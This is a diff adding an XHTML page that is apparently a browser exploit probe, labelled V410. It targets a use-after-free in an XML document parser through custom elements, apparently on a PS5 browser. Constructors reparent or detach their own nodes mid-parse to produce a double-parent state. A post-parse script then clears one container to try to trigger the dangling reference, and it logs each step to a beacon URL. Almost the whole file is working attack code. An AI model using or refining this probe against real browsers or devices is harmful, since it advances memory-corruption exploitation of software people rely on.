@@ -1,0 +1,218 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<script><![CDATA[
+// V410 - XMLDocumentParser Custom Element Re-entry UAF probe
+// Bug: constructor gets JS re-entry, parser blindly calls parserAppendChild after
+// ASSERT(!newChild.parentNode()) is stripped in release
+// Trigger: XHTML Content-Type + custom element whose constructor reparents this
+
+var qc = 0;
+function B(m) {
+  new Image().src = '/beacon/V410-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++);
+}
+
+B('INIT');
+
+// Phase 1: Verify custom elements work
+var ceSupported = false;
+try {
+  ceSupported = typeof customElements !== 'undefined' && typeof customElements.define === 'function';
+  B('CE-' + (ceSupported ? 'YES' : 'NO'));
+} catch(e) {
+  B('CE-ERR-' + (e.message || '').substring(0, 60));
+}
+
+if (!ceSupported) {
+  B('ABORT-NO-CE');
+} else {
+
+  // Phase 2: Basic custom element in XHTML (no reparenting)
+  var t1Called = false;
+  try {
+    customElements.define('test-basic', class extends HTMLElement {
+      constructor() {
+        super();
+        t1Called = true;
+      }
+    });
+    B('T1-DEF-OK');
+  } catch(e) {
+    B('T1-DEF-ERR-' + (e.message || '').substring(0, 60));
+  }
+
+  // Phase 3: Custom element that reparents itself during construction
+  // This is the actual vulnerability trigger
+  var reparentCount = 0;
+  var parserAppendAfterReparent = false;
+  var doubleParent = false;
+
+  try {
+    customElements.define('pwn-reparent', class extends HTMLElement {
+      constructor() {
+        super();
+        reparentCount++;
+        B('T2-CTOR-' + reparentCount);
+
+        // Reparent: move ourselves into a different container
+        // After constructor returns, parser will call parserAppendChild(this)
+        // which should fail because this already has a parent
+        // But on PS5 (no ASSERT), it succeeds -> double parent
+        try {
+          var altParent = document.getElementById('alt-container');
+          if (altParent) {
+            altParent.appendChild(this);
+            B('T2-REPARENT-OK-PARENT-' + (this.parentNode ? this.parentNode.id || 'anon' : 'null'));
+          } else {
+            B('T2-NO-ALT-CONTAINER');
+          }
+        } catch(e) {
+          B('T2-REPARENT-ERR-' + (e.message || '').substring(0, 60));
+        }
+      }
+    });
+    B('T2-DEF-OK');
+  } catch(e) {
+    B('T2-DEF-ERR-' + (e.message || '').substring(0, 60));
+  }
+
+  // Phase 4: Custom element that nulls m_currentNode by removing parser context
+  try {
+    customElements.define('pwn-detach', class extends HTMLElement {
+      constructor() {
+        super();
+        B('T3-CTOR');
+        // Try to remove the parser's current node from the document
+        // This could null m_currentNode if it triggers parser stack pop
+        try {
+          var container = document.getElementById('detach-container');
+          if (container && container.parentNode) {
+            container.parentNode.removeChild(container);
+            B('T3-DETACH-OK');
+          }
+        } catch(e) {
+          B('T3-DETACH-ERR-' + (e.message || '').substring(0, 60));
+        }
+      }
+    });
+    B('T3-DEF-OK');
+  } catch(e) {
+    B('T3-DEF-ERR-' + (e.message || '').substring(0, 60));
+  }
+}
+]]></script>
+</head>
+<body>
+<!-- alt-container exists BEFORE the parser hits pwn-reparent -->
+<div id="alt-container"></div>
+
+<!-- T1: basic custom element, should just construct normally -->
+<div id="basic-container"><test-basic id="basic-el"></test-basic></div>
+
+<!-- T2: reparenting element - THE BUG TRIGGER -->
+<!-- Parser will: create pwn-reparent -> run constructor (reparents to alt-container)
+     -> parserAppendChild(this) into reparent-container
+     -> DOUBLE PARENT: alt-container AND reparent-container both think they own it -->
+<div id="reparent-container"><pwn-reparent id="pwn-el"></pwn-reparent></div>
+
+<!-- T3: detach test -->
+<div id="detach-container"><pwn-detach id="detach-el"></pwn-detach></div>
+
+<!-- Post-parse check script -->
+<script><![CDATA[
+// Check results after parser finishes all elements
+setTimeout(function() {
+  B('POST-PARSE');
+
+  // T1 check
+  var basicEl = document.getElementById('basic-el');
+  B('T1-CALLED-' + t1Called);
+  B('T1-EL-' + (basicEl ? 'EXISTS' : 'MISSING'));
+  if (basicEl) {
+    B('T1-PARENT-' + (basicEl.parentNode ? basicEl.parentNode.id || 'anon' : 'null'));
+  }
+
+  // T2 check - the critical one
+  var pwnEl = document.getElementById('pwn-el');
+  B('T2-EL-' + (pwnEl ? 'EXISTS' : 'MISSING'));
+  if (pwnEl) {
+    var parent = pwnEl.parentNode;
+    B('T2-PARENT-' + (parent ? parent.id || 'anon' : 'null'));
+
+    // Check if element appears in both containers' child lists
+    var altContainer = document.getElementById('alt-container');
+    var reparentContainer = document.getElementById('reparent-container');
+
+    var inAlt = false;
+    var inReparent = false;
+
+    if (altContainer) {
+      for (var i = 0; i < altContainer.childNodes.length; i++) {
+        if (altContainer.childNodes[i] === pwnEl) { inAlt = true; break; }
+      }
+    }
+    if (reparentContainer) {
+      for (var i = 0; i < reparentContainer.childNodes.length; i++) {
+        if (reparentContainer.childNodes[i] === pwnEl) { inReparent = true; break; }
+      }
+    }
+
+    B('T2-IN-ALT-' + inAlt);
+    B('T2-IN-REPARENT-' + inReparent);
+
+    if (inAlt && inReparent) {
+      B('T2-DOUBLE-PARENT-CONFIRMED');
+
+      // Try to trigger UAF by removing one parent
+      try {
+        altContainer.innerHTML = '';
+        B('T2-ALT-CLEARED');
+
+        // Now check reparent-container's child list (should have dangling ref)
+        var stillInReparent = false;
+        try {
+          for (var i = 0; i < reparentContainer.childNodes.length; i++) {
+            if (reparentContainer.childNodes[i] === pwnEl) { stillInReparent = true; break; }
+          }
+          B('T2-STILL-IN-REPARENT-' + stillInReparent);
+        } catch(e) {
+          B('T2-REPARENT-TRAVERSE-CRASH-' + (e.message || '').substring(0, 60));
+        }
+
+        // Check if pwnEl is still alive
+        try {
+          B('T2-PWNEL-TAG-' + pwnEl.tagName);
+          B('T2-PWNEL-PARENT-' + (pwnEl.parentNode ? pwnEl.parentNode.id || 'yes' : 'null'));
+        } catch(e) {
+          B('T2-PWNEL-ACCESS-CRASH');
+        }
+      } catch(e) {
+        B('T2-CLEAR-ERR-' + (e.message || '').substring(0, 60));
+      }
+    } else if (inAlt && !inReparent) {
+      B('T2-ONLY-IN-ALT');
+      // Parser didn't append because constructor reparented
+      // This means WK-1400 fix might be present or parser stopped
+    } else if (!inAlt && inReparent) {
+      B('T2-ONLY-IN-REPARENT');
+      // Parser overwrote the reparent, element only in parser target
+    } else {
+      B('T2-IN-NEITHER');
+    }
+
+    // Count children in each container
+    B('T2-ALT-CHILDREN-' + (altContainer ? altContainer.childNodes.length : 'N'));
+    B('T2-REPARENT-CHILDREN-' + (reparentContainer ? reparentContainer.childNodes.length : 'N'));
+  }
+
+  // T3 check
+  var detachEl = document.getElementById('detach-el');
+  B('T3-EL-' + (detachEl ? 'EXISTS' : 'MISSING'));
+  var detachContainer = document.getElementById('detach-container');
+  B('T3-CONTAINER-' + (detachContainer ? 'EXISTS' : 'REMOVED'));
+
+  B('DONE');
+}, 500);
+]]></script>
+</body>
+</html>
